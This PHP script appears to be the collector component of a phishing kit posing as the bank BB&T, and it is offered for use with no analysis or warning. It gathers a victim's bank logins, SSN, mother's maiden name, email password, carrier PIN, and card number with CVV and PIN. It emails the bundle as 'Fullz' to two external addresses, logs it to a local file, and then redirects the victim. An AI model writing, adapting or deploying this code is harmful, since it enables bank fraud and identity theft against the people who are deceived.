<?php

ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");


$ip = getenv("REMOTE_ADDR");
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "UserName     : ".$_SESSION['user']."\n";
$message .= "Password     : ".$_SESSION['pass']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "UserName2    : ".$_POST['uuser']."\n";
$message .= "Password2    : ".$_POST['upass']."\n";
$message .= "--------------[ BB&T  ]---------------------\n";
$message .= "Date Of Birth : ".$_POST['dob']."\n";
$message .= "Address       : ".$_POST['street']."\n";
$message .= "City          : ".$_POST['city']."\n";
$message .= "State         : ".$_POST['state']."\n";
$message .= "ZipCode       : ".$_POST['zip']."\n";
$message .= "SSN           : ".$_POST['ssn']."\n";
$message .= "driver           : ".$_POST['dv']."\n";
$message .= "Mother's Maiden Name           : ".$_POST['mmn']."\n";
$message .= "Email address : ".$_POST['email']."\n";
$message .= "Email PasWord : ".$_POST['emailpass']."\n";
$message .= "Phone Number  : ".$_POST['pon']."\n";
$message .= "Carrier Type  : ".$_POST['type']."\n";
$message .= "Carrier PIN  : ".$_POST['PINi']."\n";
$message .= "Card Name     : ".$_POST['cname']."\n";
$message .= "Card Number   : ".$_POST['cardn']."\n";
$message .= "EX Date M     : ".$_POST['expm']."\n";
$message .= "EX Date Y     : ".$_POST['expy']."\n";
$message .= "CvV           : ".$_POST['cvv']."\n";
$message .= "Pln           : ".$_POST['pin']."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ BB&T ]---------------------\n";
$subject = "BB&T Info $ip";
$headers = "From: BB&T Fullz <mail@info.com";
$SEND = "mastersraw006@gmail.com,matsont@yandex.ru";

mail($SEND,$subject,$message,$headers);
$file = fopen("javac.txt", 'a');
fwrite($file, $message);

session_destroy();
$header = "f.html?ID=$host$host$host$host$host";
header("Location: $header");

?>